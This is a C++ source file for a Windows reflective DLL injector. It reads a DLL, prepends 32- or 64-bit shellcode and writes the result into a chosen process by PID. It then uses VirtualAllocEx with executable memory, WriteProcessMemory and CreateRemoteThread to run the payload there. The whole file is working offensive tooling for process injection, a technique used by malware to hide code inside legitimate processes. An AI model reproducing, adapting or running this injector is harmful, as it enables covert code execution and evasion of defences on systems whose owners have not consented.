#include <Windows.h>
#include <vector>
#include "shellcode.h"

void exitOnError(DWORD error, LPCSTR message)
{
	if (error)
	{
		CHAR details[1024];
		FormatMessageA(FORMAT_MESSAGE_FROM_SYSTEM, NULL, error, NULL, details, 1024, NULL);
		printf_s("[ ERR ]\t%s\n", message);
		printf_s("\n%s", details);
		exit(error);
	}
	else
	{
		printf_s("[ OK ]\t%s\n", message);
		return;
	}
}

std::vector<BYTE> bufferFile(LPCSTR path)
{
	HANDLE hFile = CreateFileA(path, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
	exitOnError(GetLastError(), "CreateFileA");
	DWORD nFileSize = GetFileSize(hFile, NULL);
	std::vector<BYTE> buffer(nFileSize);
	DWORD nBytesRead;
	ReadFile(hFile, buffer.data(), nFileSize, &nBytesRead, NULL);
	exitOnError(GetLastError(), "ReadFile");
	return buffer;
}

WORD detectMachineType(LPBYTE DLL)
{
	DWORD pHeader = *reinterpret_cast<LPDWORD>(&DLL[0x3C]) + 0x04;
	IMAGE_FILE_HEADER header = *reinterpret_cast<PIMAGE_FILE_HEADER>(&DLL[pHeader]);
	return header.Machine;
}

std::vector<BYTE> createPayload(std::vector<BYTE> DLL)
{
	WORD machineType = detectMachineType(DLL.data());

	if (machineType == IMAGE_FILE_MACHINE_I386)
	{
		exitOnError(0, "I386 image detected");
		std::vector<BYTE> payload(shellcode32.begin(), shellcode32.end());
		*reinterpret_cast<LPDWORD>(&payload.data()[0x12]) = 0x2C + shellcode32.size() + DLL.size();
		payload.insert(payload.end(), DLL.begin(), DLL.end());
		return payload;
	}
	else if (machineType == IMAGE_FILE_MACHINE_AMD64)
	{
		exitOnError(0, "AMD64 image detected");
		std::vector<BYTE> payload(shellcode64.begin(), shellcode64.end());
		*reinterpret_cast<LPDWORD>(&payload.data()[0x18]) = 0x3B + shellcode64.size() + DLL.size();
		payload.insert(payload.end(), DLL.begin(), DLL.end());
		return payload;
	}
	else
	{
		exitOnError(ERROR_BAD_FILE_TYPE, "Unsupported DLL");
	}

	exitOnError(0, "Shellcode generated");
}

int main(int argc, char* argv[])
{
	if (argc != 3)
	{
		printf_s("Usage: %s <PID> <DLL Path>\n", argv[0]);
	}
	else
	{
		printf_s("\nReflective DLL Injector\n\n");
		std::vector<BYTE> file = bufferFile(argv[2]);
		std::vector<BYTE> payload = createPayload(file);
		HANDLE hProcess = OpenProcess(PROCESS_VM_OPERATION | PROCESS_VM_WRITE | PROCESS_CREATE_THREAD, FALSE, atoi(argv[1]));
		exitOnError(GetLastError(), "OpenProcess");
		LPVOID pAlloc = VirtualAllocEx(hProcess, NULL, payload.size(), MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);
		exitOnError(GetLastError(), "VirtualAllocEx");
		WriteProcessMemory(hProcess, pAlloc, payload.data(), payload.size(), NULL);
		exitOnError(GetLastError(), "WriteProcessMemory");
		CreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)pAlloc, NULL, 0, NULL);
		exitOnError(GetLastError(), "CreateRemoteThread");
		CloseHandle(hProcess);
		printf_s("\nDLL Injected!\n");
	}
	return 0;
}